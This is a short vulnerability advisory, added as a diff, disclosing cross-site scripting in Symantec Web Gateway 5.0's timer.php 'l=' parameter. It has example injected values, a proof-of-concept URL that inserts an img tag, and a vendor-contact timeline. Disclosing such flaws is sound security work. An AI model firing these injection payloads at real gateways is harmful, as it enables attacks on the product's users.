@@ -1,0 +1,28 @@
+# Exploit Title: Symantec Web Gateway Cross Site Scripting
+# Google Dork: N/A
+# Date: 05/02/2012
+# Author: B00y@
+# Software Link: http://www.symantec.com/
+# Version: 5.0
+# Tested on: Windows XP
+# Browser: IE 8.0 and Firefox 11.0
+
+
+Symantec Web Gateway is susceptible to cross site scripting when scanning downloaded files due to lack of proper sanitizing of the file length. The affected value is the (l=) parameter that identifies the length of the file been scanned and it fails to validate whenever the values are string or integer taking both of them.
+
+This vulnerability was tested with Symantec Web Gateway fully updated to the last version, older versions may be affected as well.
+
+
+Examples:
+
+l=283883'<img src="myimage.jpg">
+
+l=<img src="myimage.jpg">
+
+POC:
+
+http://10.0.0.2/spywall/timer.php?d=4099&l=22665'<img src="myimage.jpg">&profile=40
+
+Vendor Contacted: March 09, 2012
+Vendor Responded: Releasing update May 11, 2012
+Current Status: Not Fixed.
